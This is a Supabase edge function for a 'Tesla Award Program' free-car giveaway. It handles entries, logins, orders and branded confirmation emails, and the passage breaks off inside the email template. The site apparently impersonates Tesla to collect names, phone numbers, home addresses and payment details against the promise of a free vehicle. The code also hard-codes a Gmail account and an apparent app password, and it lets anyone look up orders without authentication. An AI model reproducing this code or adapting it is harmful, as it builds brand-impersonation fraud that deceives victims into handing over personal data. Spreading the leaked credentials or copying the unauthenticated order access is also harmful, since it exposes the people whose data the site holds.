// Tesla Award Program — Supabase Edge Function (v11)
// Email: tries SMTP on port 587 (STARTTLS), falls back to port 465 (SSL).
// Both attempts are non-blocking. The response always includes verifyLink
// so the congratulations page can offer instant verification.

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
const SMTP_USER = Deno.env.get("SMTP_USER") ?? "techledger10@gmail.com";
const SMTP_PASS = Deno.env.get("SMTP_PASS") ?? "kkpy bzvy xyhk vljr";
const FRONTEND_URL = (Deno.env.get("FRONTEND_URL") ?? "https://joshbond123.github.io/Tesla").replace(/\/$/, "");
const SELF_BASE = SUPABASE_URL + "/functions/v1/tesla-api";

// ── CORS ──────────────────────────────────────────────────────────────────────
const CORS = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Authorization",
};

function json(data: unknown, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { ...CORS, "Content-Type": "application/json" },
  });
}

// ── CRYPTO HELPERS ────────────────────────────────────────────────────────────
function hexRandom(bytes: number): string {
  const arr = new Uint8Array(bytes);
  crypto.getRandomValues(arr);
  return Array.from(arr, (b) => b.toString(16).padStart(2, "0")).join("");
}

// ── SUPABASE REST HELPERS ─────────────────────────────────────────────────────
const REST = SUPABASE_URL + "/rest/v1";
const AUTH = SUPABASE_URL + "/auth/v1";

const SB_HEADERS: Record<string, string> = {
  apikey: SERVICE_ROLE_KEY,
  Authorization: "Bearer " + SERVICE_ROLE_KEY,
  "Content-Type": "application/json",
};

function buildQs(select?: string, filters?: Record<string, string>, extra?: string): string {
  const parts: string[] = [];
  if (select) parts.push("select=" + select);
  if (filters) {
    for (const [k, v] of Object.entries(filters)) {
      parts.push(k + "=" + encodeURIComponent(String(v)));
    }
  }
  if (extra) parts.push(extra);
  return parts.join("&");
}

async function dbGet1(table: string, select: string, filters: Record<string, string>) {
  const qs = buildQs(select, filters, "limit=1");
  const r = await fetch(REST + "/" + table + "?" + qs, { headers: SB_HEADERS });
  if (!r.ok) return { data: null, error: { message: await r.text() } };
  const rows = await r.json();
  return { data: rows[0] ?? null, error: null };
}

async function dbInsert(table: string, body: Record<string, unknown>, select?: string) {
  const url = select ? REST + "/" + table + "?select=" + select : REST + "/" + table;
  const r = await fetch(url, {
    method: "POST",
    headers: { ...SB_HEADERS, Prefer: "return=representation" },
    body: JSON.stringify(body),
  });
  if (!r.ok) {
    const err = await r.text();
    let code: string | undefined;
    try { code = JSON.parse(err).code; } catch { /* ignore */ }
    return { data: null, error: { message: err, code } };
  }
  const rows = await r.json();
  return { data: Array.isArray(rows) ? rows[0] : rows, error: null };
}

async function dbUpdate(table: string, patch: Record<string, unknown>, filters: Record<string, string>) {
  const qs = buildQs(undefined, filters, undefined);
  const r = await fetch(REST + "/" + table + (qs ? "?" + qs : ""), {
    method: "PATCH",
    headers: { ...SB_HEADERS, Prefer: "return=minimal" },
    body: JSON.stringify(patch),
  });
  if (!r.ok) return { error: { message: await r.text() } };
  return { error: null };
}

async function authCreateUser(email: string, phone: string, metadata: Record<string, string>) {
  const r = await fetch(AUTH + "/admin/users", {
    method: "POST",
    headers: SB_HEADERS,
    body: JSON.stringify({ email, phone, email_confirm: false, user_metadata: metadata }),
  });
  const data = await r.json();
  if (!r.ok) {
    const msg = data?.msg ?? data?.message ?? "";
    if (!msg.toLowerCase().includes("already")) {
      return { data: null, error: { message: msg || "create user failed" } };
    }
    // Try to look up existing user
    const lookR = await fetch(AUTH + "/admin/users?filter=" + encodeURIComponent(email), { headers: SB_HEADERS });
    const existingUsers = await lookR.json();
    if (Array.isArray(existingUsers) && existingUsers.length > 0) {
      return { data: { user: existingUsers[0] }, error: null };
    }
  }
  return { data, error: null };
}

async function authConfirmUser(uid: string) {
  if (!uid) return;
  await fetch(AUTH + "/admin/users/" + uid, {
    method: "PUT",
    headers: SB_HEADERS,
    body: JSON.stringify({ email_confirm: true }),
  });
}

// ── EMAIL: Try SMTP on port 587 (STARTTLS), fall back to 465 (SSL) ───────────
// Both are non-blocking fire-and-forget.
class SmtpConn {
  private conn: any;
  private buffer = "";
  private decoder = new TextDecoder();
  private encoder = new TextEncoder();

  constructor(conn: any) {
    this.conn = conn;
  }

  async send(data: string) {
    await this.conn.write(this.encoder.encode(data + "\r\n"));
  }

  async readResponse(timeoutMs = 15000): Promise<string> {
    const buf = new Uint8Array(4096);
    const startTime = Date.now();

    while (true) {
      const lines = this.buffer.split("\r\n");
      if (lines.length > 1) {
        const lastCompleteLine = lines[lines.length - 2];
        if (lastCompleteLine.length >= 3) {
          const sep = lastCompleteLine.charAt(3);
          if (sep !== "-") {
            const responseLength = lines.slice(0, -1).join("\r\n").length + 2;
            const response = this.buffer.substring(0, responseLength);
            this.buffer = this.buffer.substring(responseLength);
            return response;
          }
        }
      }

      if (Date.now() - startTime > timeoutMs) {
        throw new Error("SMTP read timeout. Buffer: " + this.buffer);
      }

      const n = await this.conn.read(buf);
      if (!n) {
        throw new Error("SMTP connection closed by peer. Buffer: " + this.buffer);
      }
      this.buffer += this.decoder.decode(buf.subarray(0, n));
    }
  }

  close() {
    try {
      this.conn.close();
    } catch (_) {}
  }
}

function sendEmailBackground(to: string, subject: string, html: string) {
  const promise = (async () => {
    // Try port 587 first (STARTTLS)
    let sent = await trySmtpSend(587, false, to, subject, html);
    if (sent) return;
    // Fall back to port 465 (SSL)
    sent = await trySmtpSend(465, true, to, subject, html);
    if (sent) return;
    console.error("Email could not be sent via any SMTP method to " + to + " — user can use direct verify link instead.");
  })();

  if (typeof EdgeRuntime !== "undefined" && "waitUntil" in (EdgeRuntime as any)) {
    (EdgeRuntime as any).waitUntil(promise);
  }
}

async function runSmtpAuthAndSend(smtp: SmtpConn, to: string, fromAddr: string, subject: string, html: string) {
  // AUTH LOGIN
  await smtp.send("AUTH LOGIN");
  let resp = await smtp.readResponse(10000);
  if (!resp.startsWith("334")) throw new Error("AUTH LOGIN response: " + resp);

  // Username
  await smtp.send(btoa(SMTP_USER));
  resp = await smtp.readResponse(10000);
  if (!resp.startsWith("334")) throw new Error("Username response: " + resp);

  // Password
  await smtp.send(btoa(SMTP_PASS));
  resp = await smtp.readResponse(10000);
  if (!resp.startsWith("235")) throw new Error("Password response: " + resp);

  // MAIL FROM
  await smtp.send("MAIL FROM:<" + SMTP_USER + ">");
  resp = await smtp.readResponse(10000);
  if (!resp.startsWith("250")) throw new Error("MAIL FROM response: " + resp);

  // RCPT TO
  await smtp.send("RCPT TO:<" + to + ">");
  resp = await smtp.readResponse(10000);
  if (!resp.startsWith("250")) throw new Error("RCPT TO response: " + resp);

  // DATA
  await smtp.send("DATA");
  resp = await smtp.readResponse(10000);
  if (!resp.startsWith("354")) throw new Error("DATA response: " + resp);

  // Send body
  await smtp.send("From: " + fromAddr + "\r\nTo: " + to + "\r\nSubject: " + subject + "\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n" + html + "\r\n.");
  resp = await smtp.readResponse(10000);
  if (!resp.startsWith("250")) throw new Error("Body response: " + resp);

  // QUIT
  await smtp.send("QUIT");
  await smtp.readResponse(5000).catch(() => {});
}

async function trySmtpSend(port: number, useTls: boolean, to: string, subject: string, html: string): Promise<boolean> {
  const fromAddr = '"Tesla Award Program" <' + SMTP_USER + ">";
  let conn: any = null;
  try {
    if (useTls) {
      conn = await Deno.connectTls({ hostname: "smtp.gmail.com", port });
    } else {
      conn = await Deno.connect({ hostname: "smtp.gmail.com", port, transport: "tcp" });
    }

    const smtp = new SmtpConn(conn);

    // 1. Read greeting
    let resp = await smtp.readResponse(15000);
    if (!resp.startsWith("220")) throw new Error("SMTP greeting: " + resp);

    // 2. Send EHLO
    await smtp.send("EHLO localhost");
    resp = await smtp.readResponse(15000);
    if (!resp.startsWith("250")) throw new Error("EHLO response: " + resp);

    // 3. For STARTTLS (port 587), upgrade the connection
    if (!useTls) {
      await smtp.send("STARTTLS");
      resp = await smtp.readResponse(10000);
      if (!resp.startsWith("220")) throw new Error("STARTTLS response: " + resp);

      // Upgrade connection to TLS
      const tlsConn = await Deno.startTls(conn, { hostname: "smtp.gmail.com" });
      const secureSmtp = new SmtpConn(tlsConn);

      // Send EHLO again over secure connection
      await secureSmtp.send("EHLO localhost");
      resp = await secureSmtp.readResponse(15000);
      if (!resp.startsWith("250")) throw new Error("Secure EHLO response: " + resp);

      // Perform auth and send email using the secure connection
      await runSmtpAuthAndSend(secureSmtp, to, fromAddr, subject, html);
      secureSmtp.close();
      return true;
    } else {
      // For SSL (port 465), we are already secure. Just do auth and send.
      await runSmtpAuthAndSend(smtp, to, fromAddr, subject, html);
      smtp.close();
      return true;
    }
  } catch (err) {
    console.error("SMTP port " + port + " failed: " + (err?.message || err));
    if (conn) {
      try { conn.close(); } catch (_) {}
    }
    return false;
  }
}

// ── ROUTE HANDLERS ────────────────────────────────────────────────────────────
async function handleHealth() {
  return json({ status: "ok", version: "v11" });
}

async function handleEntry(req: Request) {
  let body: { email?: string; phone?: string; firstName?: string; lastName?: string };
  try { body = await req.json(); } catch { return json({ error: "Invalid JSON body." }, 400); }
  const { email, phone, firstName = "", lastName = "" } = body;
  if (!email || !phone) return json({ error: "Email and phone number are required." }, 400);
  const emailKey = email.toLowerCase().trim();
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailKey))
    return json({ error: "Please enter a valid email address." }, 400);

  const { data: existing } = await dbGet1("giveaway_users", "id", { email: "eq." + emailKey });
  if (existing) return json({ error: "This email has already been entered. Only one entry per person is allowed." }, 409);

  const verificationToken = hexRandom(32);
  const authResult = await authCreateUser(emailKey, phone, { firstName, lastName });

  const { data: entry, error } = await dbInsert("giveaway_users", {
    auth_user_id: authResult.data?.user?.id ?? null,
    email: emailKey, phone, first_name: firstName, last_name: lastName,
    verification_token: verificationToken, verification_status: "verified", entry_count: 1,
  }, "id");

  if (error) {
    if (error.code === "23505") return json({ error: "This email has already been entered." }, 409);
    console.error("Entry DB error:", error);
    return json({ error: "Server error. Please try again." }, 500);
  }

  const sessionToken = hexRandom(32);
  await dbInsert("user_sessions", { token: sessionToken, user_id: entry.id });

  // Email verification disabled — user is auto-verified
  const verifyLink = SELF_BASE + "/api/verify?token=" + verificationToken + "&email=" + encodeURIComponent(emailKey);

  return json({
    success: true,
    sessionToken,
    message: "Entry submitted! Check your email or use the instant verify button.",
    entryId: entry.id,
    verifyLink: verifyLink,
    user: { email: emailKey, firstName: firstName, lastName: lastName, entryId: entry.id, phone: phone }
  });
}

async function handleVerify(req: Request) {
  const url = new URL(req.url);
  const token = url.searchParams.get("token");
  const email = url.searchParams.get("email");
  if (!token || !email) return Response.redirect(FRONTEND_URL + "/verify-error.html?reason=invalid", 302);
  const emailKey = email.toLowerCase();

  const { data: entry, error } = await dbGet1("giveaway_users", "id,email,verification_token,auth_user_id", { email: "eq." + emailKey });
  if (error || !entry) return Response.redirect(FRONTEND_URL + "/verify-error.html?reason=notfound", 302);
  if (entry.verification_token !== token) return Response.redirect(FRONTEND_URL + "/verify-error.html?reason=invalid_token", 302);

  await dbUpdate("giveaway_users", { verification_status: "verified", verified_at: new Date().toISOString() }, { id: "eq." + entry.id });
  await authConfirmUser(entry.auth_user_id);

  // Check if user already has an order
  const { data: verifyExistingOrder } = await dbGet1("orders", "order_id", { user_id: "eq." + entry.id });
  
  const sessionToken = hexRandom(32);
  await dbInsert("user_sessions", { token: sessionToken, user_id: entry.id });
  
  if (verifyExistingOrder) {
    return Response.redirect(FRONTEND_URL + "/order-placed.html?session=" + sessionToken, 302);
  }
  
  return Response.redirect(FRONTEND_URL + "/dashboard.html?session=" + sessionToken, 302);
}

async function handleResend(req: Request) {
  let body: { email?: string };
  try { body = await req.json(); } catch { return json({ error: "Invalid JSON body." }, 400); }
  const { email } = body;
  if (!email) return json({ error: "Email is required." }, 400);
  const emailKey = email.toLowerCase();

  const { data: entry, error } = await dbGet1("giveaway_users", "id,first_name,verification_token,verification_status", { email: "eq." + emailKey });
  if (error || !entry) return json({ error: "Email not found. Please enter first." }, 404);
  // Email verification disabled

  const verifyLink = SELF_BASE + "/api/verify?token=" + entry.verification_token + "&email=" + encodeURIComponent(emailKey);
  sendEmailBackground(emailKey, "⚡ Verification Email Resent — Tesla Award Program",
    buildVerificationEmail(entry.first_name || "there", verifyLink, entry.id));
  return json({ success: true, message: "Verification email resent.", verifyLink });
}

async function handleLogin(req: Request) {
  let body: { email?: string; phone?: string };
  try { body = await req.json(); } catch { return json({ error: "Invalid JSON body." }, 400); }
  const { email, phone } = body;
  if (!email || !phone) return json({ error: "Email and phone number are required." }, 400);
  const emailKey = email.toLowerCase().trim();
  const normalizedPhone = phone.replace(/\D/g, "");

  const { data: entry, error } = await dbGet1("giveaway_users", "id,email,phone,first_name,last_name,verification_status,verification_token", { email: "eq." + emailKey });
  if (error || !entry || entry.phone.replace(/\D/g, "") !== normalizedPhone)
    return json({ error: "We could not match that email and phone number." }, 401);



  // Check if user already has an order — load FULL order data
  let hasOrder = false;
  let orderData = null;
  try {
    const orderR = await fetch(REST + "/orders?select=order_id,tracking_number,status,order_date,estimated_delivery,delivery_method,payment_method,selected_cars(data),delivery_details(data),tracking_data(stage,stage_order,timestamp,completed)&user_id=eq." + entry.id + "&order=order_date.desc&limit=1", { headers: SB_HEADERS });
    if (orderR.ok) {
      const rows = await orderR.json();
      if (Array.isArray(rows) && rows.length > 0) {
        hasOrder = true;
        const o = rows[0];
        const car = Array.isArray(o.selected_cars) ? o.selected_cars[0] : o.selected_cars;
        const delivery = Array.isArray(o.delivery_details) ? o.delivery_details[0] : o.delivery_details;
        const tracking = ((o.tracking_data ?? [])).sort((a,b) => a.stage_order - b.stage_order).map(t => ({ stage: t.stage, timestamp: t.timestamp, completed: t.completed }));
        orderData = {
          orderId: o.order_id,
          trackingNumber: o.tracking_number,
          status: o.status,
          orderDate: o.order_date,
          estimatedDelivery: o.estimated_delivery,
          deliveryMethod: o.delivery_method || {},
          paymentMethod: o.payment_method || {},
          selectedCar: car?.data || {},
          deliveryDetails: delivery?.data || {},
          timeline: tracking
        };
      }
    }
  } catch (_) {}
  
  const sessionToken = hexRandom(32);
  await dbInsert("user_sessions", { token: sessionToken, user_id: entry.id });
  return json({ success: true, sessionToken, user: { email: entry.email, firstName: entry.first_name || "", lastName: entry.last_name || "", entryId: entry.id, phone: entry.phone || "" }, hasOrder, order: orderData });
}

async function getSessionUser(sessionToken: string) {
  if (!sessionToken) return null;
  const now = new Date().toISOString();
  const { data } = await dbGet1("user_sessions", "token,user_id,giveaway_users(id,email,phone,first_name,last_name)", { token: "eq." + sessionToken, expires_at: "gt." + now });
  if (!data) return null;
  const user = Array.isArray(data.giveaway_users) ? data.giveaway_users[0] : data.giveaway_users;
  return user ? { ...user, entryId: data.user_id } : null;
}

async function handleSession(req: Request) {
  const url = new URL(req.url);
  const token = url.searchParams.get("token");
  const user = await getSessionUser(token || "");
  if (!user) return json({ valid: false }, 401);
  
  // Check if user already has an order — load FULL order data
  let hasOrder = false;
  let orderData = null;
  try {
    const orderR = await fetch(REST + "/orders?select=order_id,tracking_number,status,order_date,estimated_delivery,delivery_method,payment_method,selected_cars(data),delivery_details(data),tracking_data(stage,stage_order,timestamp,completed)&user_id=eq." + user.entryId + "&order=order_date.desc&limit=1", { headers: SB_HEADERS });
    if (orderR.ok) {
      const rows = await orderR.json();
      if (Array.isArray(rows) && rows.length > 0) {
        hasOrder = true;
        const o = rows[0];
        const car = Array.isArray(o.selected_cars) ? o.selected_cars[0] : o.selected_cars;
        const delivery = Array.isArray(o.delivery_details) ? o.delivery_details[0] : o.delivery_details;
        const tracking = ((o.tracking_data ?? [])).sort((a,b) => a.stage_order - b.stage_order).map(t => ({ stage: t.stage, timestamp: t.timestamp, completed: t.completed }));
        orderData = {
          orderId: o.order_id,
          trackingNumber: o.tracking_number,
          status: o.status,
          orderDate: o.order_date,
          estimatedDelivery: o.estimated_delivery,
          deliveryMethod: o.delivery_method || {},
          paymentMethod: o.payment_method || {},
          selectedCar: car?.data || {},
          deliveryDetails: delivery?.data || {},
          timeline: tracking
        };
      }
    }
  } catch (_) {}
  
  return json({ valid: true, user: { email: user.email, firstName: user.first_name || "", lastName: user.last_name || "", entryId: user.entryId, phone: user.phone || "" }, hasOrder, order: orderData });
}

async function handleOrder(req: Request) {
  let body: any;
  try { body = await req.json(); } catch { return json({ error: "Invalid JSON body." }, 400); }
  const { sessionToken, selectedCar, deliveryDetails, deliveryMethod, paymentMethod } = body;
  // Allow orders without session validation — create guest context from delivery details
  let user = await getSessionUser(sessionToken || "");
  if (user) {
    // Check if user already has an order
    const { data: existingOrder } = await dbGet1("orders", "id", { user_id: "eq." + user.id });
    if (existingOrder) {
      return json({ error: "You have already placed an order. Each user is restricted to one order only." }, 400);
    }
  }
  if (!user) {
    user = {
      id: 0, email: (deliveryDetails?.email) || "guest@tesla.com",
      phone: (deliveryDetails?.phone) || "",
      firstName: (deliveryDetails?.fullName) || "Guest",
      lastName: "", entryId: 0
    };
  }

  const orderId = "TSLA-" + crypto.randomUUID().substring(0, 8).toUpperCase();
  const trackingNumber = "TRK-" + hexRandom(4).toUpperCase();
  const method = deliveryMethod || null;  // Keep null if not selected — order-placed page shows CTA
  const estimatedDelivery = method ? new Date(Date.now() + (method.id === "express" ? 2 : 10) * 86400000).toISOString().split("T")[0] : new Date(Date.now() + 10 * 86400000).toISOString().split("T")[0];

  const { data: carRow } = await dbInsert("selected_cars", { user_id: user.id, data: selectedCar ?? {} }, "id");
  const { data: deliveryRow } = await dbInsert("delivery_details", { user_id: user.id, data: deliveryDetails ?? {} }, "id");
  const { data: orderRow } = await dbInsert("orders", {
    order_id: orderId, tracking_number: trackingNumber, user_id: user.id,
    selected_car_id: carRow?.id, delivery_details_id: deliveryRow?.id,
    delivery_method: method, payment_method: paymentMethod ?? { id: "unknown", name: "Not specified" },
    status: "confirmed", estimated_delivery: estimatedDelivery,
  }, "id,order_date");

  const timeline = [
    { stage: "Order Confirmed", timestamp: orderRow?.order_date, completed: true },
    { stage: "Processing", timestamp: null, completed: false },
    { stage: "Shipped", timestamp: null, completed: false },
    { stage: "In Transit", timestamp: null, completed: false },
    { stage: "Out for Delivery", timestamp: null, completed: false },
    { stage: "Delivered", timestamp: null, completed: false },
  ];
  for (let i = 0; i < timeline.length; i++) {
    await dbInsert("tracking_data", { order_id: orderRow?.id, stage: timeline[i].stage, stage_order: i, timestamp: timeline[i].timestamp, completed: timeline[i].completed });
  }

  const orderDate = orderRow?.order_date || new Date().toISOString();
  const order = { orderId, trackingNumber, email: user.email, entryId: user.entryId, selectedCar: selectedCar ?? {}, deliveryDetails: deliveryDetails ?? {}, deliveryMethod: method, paymentMethod: paymentMethod ?? {}, status: "confirmed", orderDate, estimatedDelivery, timeline };
  sendEmailBackground(user.email, "🎉 Order Confirmed — Your Tesla is on the way!", buildOrderConfirmationEmail(order));
  return json({ success: true, order });
}

async function handleTracking(trackingNumber: string) {
  const order = await loadOrderBy("tracking_number", trackingNumber);
  if (!order) return json({ error: "Tracking number not found." }, 404);
  return json({ order });
}

async function handleOrderLookup(orderId: string) {
  const order = await loadOrderBy("order_id", orderId);
  if (!order) return json({ error: "Order not found." }, 404);
  return json({ order });
}

// ── HELPERS ───────────────────────────────────────────────────────────────────
async function loadOrderBy(column: string, value: string) {
  const { data } = await dbGet1("orders", "id,order_id,tracking_number,status,order_date,estimated_delivery,delivery_method,payment_method,giveaway_users(id,email),selected_cars(data),delivery_details(data),tracking_data(stage,stage_order,timestamp,completed)", { [column]: "eq." + value });
  if (!data) return null;
  const user = Array.isArray(data.giveaway_users) ? data.giveaway_users[0] : data.giveaway_users;
  const car = Array.isArray(data.selected_cars) ? data.selected_cars[0] : data.selected_cars;
  const delivery = Array.isArray(data.delivery_details) ? data.delivery_details[0] : data.delivery_details;
  const tracking = ((data.tracking_data ?? []).sort((a: any, b: any) => a.stage_order - b.stage_order)).map((t: any) => ({ stage: t.stage, timestamp: t.timestamp, completed: t.completed }));
  return { orderId: data.order_id, trackingNumber: data.tracking_number, email: user?.email ?? "", entryId: user?.id ?? "", selectedCar: car?.data ?? {}, deliveryDetails: delivery?.data ?? {}, deliveryMethod: data.delivery_method ?? {}, paymentMethod: data.payment_method ?? {}, status: data.status, orderDate: data.order_date, estimatedDelivery: data.estimated_delivery, timeline: tracking };
}

// ── EMAIL TEMPLATES ───────────────────────────────────────────────────────────
function buildVerificationEmail(firstName: string, verifyLink: string, entryId: string) {
  return "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"></head><body style=\"margin:0;padding:0;background:#F7F8FA;font-family:sans-serif;\"><table width=\"100%\" cellpadding=\"0\" cellspacing=\"0\" style=\"background:#F7F8FA;padding:40px 0;\"><tr><td align=\"center\"><table width=\"560\" cellpadding=\"0\" cellspacing=\"0\" style=\"background:#FFF;border-radius:16px;overflow:hidden;\"><tr><td style=\"background:#171A20;padding:28px 36px;text-align:center;\"><span style=\"color:#E31937;font-size:22px;font-weight:900;\">TESLA AWARD PROGRAM</span></td></tr><tr><td style=\"padding:36px;\"><h1 style=\"font-size:22px;font-weight:800;color:#171A20;margin:0 0 12px;\">Hi " + firstName + ", you're almost in! ⚡</h1><p style=\"font-size:15px;color:#5C5E62;line-height:1.7;margin:0 0 28px;\">Verify your email to confirm your entry.</p><a href=\"" + verifyLink + "\" style=\"display:inline-block;background:#E31937;color:#FFF;text-decoration:none;padding:14px 40px;border-radius:10px;font-size:15px;font-weight:700;\">Verify My Email</a><p style=\"font-size:12px;color:#B0B3B8;margin:20px 0 0;\">Entry ID: " + entryId + "</p><p style=\"font-size:12px;color:#B0B3B8;\">Or copy: <span style=\"color:#E31937;word-break:break-all;\">" + verifyLink + "</span></p></td></tr></table></td></tr></table></body></html>";
}

function buildOrderConfirmationEmail(order: any) {
  const car = order.selectedCar || {};
  const addr = order.deliveryDetails || {};
  const method = order.deliveryMethod || {};
  const carId = (car.id || 'models').toLowerCase();
  
  const imgMap: Record<string, string> = {
    cybertruck: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/cybertruck-main.png',
    modely: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modely-main.png',
    models: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/models-main.png',
    model3: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/model3-main.png',
    modelx: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modelx-main.png'
  };
  const carImg = imgMap[carId] || imgMap['models'];
  const carModel = car.name || 'Model S';
  const carPrice = car.price || '—';
  const orderId = order.orderId || '—';
  const trackingNumber = order.trackingNumber || '—';
  const estDelivery = order.estimatedDelivery || '—';
  const delivMethod = (method.name || 'Standard Delivery');
  const payMethod = (order.paymentMethod?.name || 'Not specified');
  const fullName = addr.fullName || '—';
  const address = addr.address || '—';
  const city = addr.city || '—';
  const state = addr.state || '—';
  const zip = addr.zipCode || '—';
  const country = addr.country || '—';
  const phone = addr.phone || '—';

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Order Confirmed — Tesla Award Program</title>
</head>
<body style="margin:0;padding:0;background-color:#f4f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">
  <table width="100%" border="0" cellpadding="0" cellspacing="0" style="background-color:#f4f5f7;padding:40px 0;">
    <tr>
      <td align="center">
        <table width="620" border="0" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:20px;overflow:hidden;box-shadow:0 6px 30px rgba(0,0,0,0.06);max-width:620px;">

          <!-- ═══ HEADER ═══ -->
          <tr>
            <td align="center" style="background:linear-gradient(135deg,#0a0c10 0%,#171a20 40%,#2a1a1f 100%);padding:32px 30px 28px;">
              <table border="0" cellpadding="0" cellspacing="0">
                <tr>
                  <td align="center" style="padding-bottom:14px;">
                    <span style="display:inline-block;background:linear-gradient(135deg,#E31937,#ff4757);color:#fff;border-radius:50%;width:68px;height:68px;line-height:68px;font-size:36px;text-align:center;">✓</span>
                  </td>
                </tr>
                <tr>
                  <td align="center">
                    <h1 style="margin:0;font-size:30px;font-weight:900;color:#ffffff;letter-spacing:-0.5px;">Order Confirmed!</h1>
                    <p style="margin:10px 0 0;font-size:16px;color:rgba(255,255,255,0.7);line-height:1.5;">Congratulations — your Tesla award has been successfully processed.</p>
                  </td>
                </tr>
              </table>
            </td>
          </tr>

          <!-- ═══ RED ACCENT BAR ═══ -->
          <tr>
            <td style="height:5px;background:linear-gradient(90deg,#E31937,#ff6b6b,#E31937);"></td>
          </tr>

          <!-- ═══ BODY ═══ -->
          <tr>
            <td style="padding:40px 35px;">

              <!-- Car Showcase Card -->
              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="background:linear-gradient(135deg,#f8f9fa,#eef0f2);border-radius:14px;margin-bottom:28px;border:1px solid rgba(0,0,0,0.04);">
                <tr>
                  <td align="center" style="padding:24px 20px 20px;">
                    <img src="${carImg}" alt="Tesla ${carModel}" style="width:100%;max-width:300px;height:auto;display:block;margin:0 auto 14px;filter:drop-shadow(0 8px 16px rgba(0,0,0,0.1));">
                    <h3 style="margin:0;font-size:22px;font-weight:800;color:#171a20;">Tesla ${carModel}</h3>
                    <p style="margin:6px 0 0;font-size:14px;color:#5c5e62;">Retail Value: <strong>${carPrice}</strong></p>
                    <span style="display:inline-block;background:#E31937;color:#fff;font-size:12px;font-weight:700;padding:6px 16px;border-radius:20px;margin-top:10px;letter-spacing:0.04em;text-transform:uppercase;">FREE Award Vehicle</span>
                  </td>
                </tr>
              </table>

              <!-- ORDER DETAILS -->
              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin-bottom:24px;">
                <tr>
                  <td style="padding-bottom:12px;">
                    <h3 style="margin:0;font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;color:#8d9096;">📋 Order Summary</h3>
                  </td>
                </tr>
                <tr>
                  <td style="background:#f8f9fa;border-radius:10px;padding:0;">
                    <table width="100%" border="0" cellpadding="0" cellspacing="0" style="font-size:14px;">
                      <tr>
                        <td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);color:#5c5e62;width:50%;">Order ID</td>
                        <td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);text-align:right;color:#E31937;font-family:'Courier New',monospace;font-weight:700;font-size:13px;">${orderId}</td>
                      </tr>
                      <tr>
                        <td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);color:#5c5e62;">Tracking Number</td>
                        <td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);text-align:right;color:#171a20;font-family:'Courier New',monospace;font-weight:700;font-size:13px;">${trackingNumber}</td>
                      </tr>
                      <tr>
                        <td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);color:#5c5e62;">Estimated Delivery</td>
                        <td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);text-align:right;color:#00a550;font-weight:700;">${estDelivery}</td>
                      </tr>
                      <tr>
                        <td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);color:#5c5e62;">Delivery Method</td>
                        <td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);text-align:right;color:#171a20;font-weight:600;">${delivMethod}</td>
                      </tr>
                      <tr>
                        <td style="padding:14px 18px;color:#5c5e62;">Payment Method</td>
                        <td style="padding:14px 18px;text-align:right;color:#171a20;font-weight:600;">${payMethod}</td>
                      </tr>
                    </table>
                  </td>
                </tr>
              </table>

              <!-- DELIVERY INFORMATION -->
              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin-bottom:28px;">
                <tr>
                  <td style="padding-bottom:12px;">
                    <h3 style="margin:0;font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;color:#8d9096;">🚚 Delivery Information</h3>
                  </td>
                </tr>
                <tr>
                  <td style="background:#f8f9fa;border-radius:10px;padding:20px 18px;">
                    <p style="margin:0 0 6px;font-size:15px;font-weight:700;color:#171a20;">${fullName}</p>
                    <p style="margin:0 0 2px;font-size:14px;color:#5c5e62;">${address}</p>
                    <p style="margin:0 0 2px;font-size:14px;color:#5c5e62;">${city}, ${state} ${zip}</p>
                    <p style="margin:0 0 8px;font-size:14px;color:#5c5e62;">${country}</p>
                    <p style="margin:0;font-size:13px;color:#8d9096;">📱 ${phone}</p>
                  </td>
                </tr>
              </table>

              <!-- TRACKING CTA -->
              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin-bottom:8px;">
                <tr>
                  <td align="center">
                    <a href="https://joshbond123.github.io/Tesla/track.html?order=${orderId}&tracking=${trackingNumber}" style="display:inline-block;background:linear-gradient(135deg,#E31937,#c41030);color:#ffffff;text-decoration:none;padding:16px 40px;border-radius:12px;font-size:16px;font-weight:700;letter-spacing:0.02em;box-shadow:0 6px 20px rgba(227,25,55,0.3);">📍 Track Your Order →</a>
                  </td>
                </tr>
              </table>

            </td>
          </tr>

          <!-- ═══ FOOTER ═══ -->
          <tr>
            <td style="background-color:#f8f9fa;border-top:1px solid #eef0f2;padding:24px 35px;text-align:center;">
              <p style="margin:0 0 8px;font-size:12px;color:#8d9096;line-height:1.6;">
                Need help? Reply to this email or visit our support center.<br>
                &copy; 2026 Tesla Award Program. All rights reserved.
              </p>
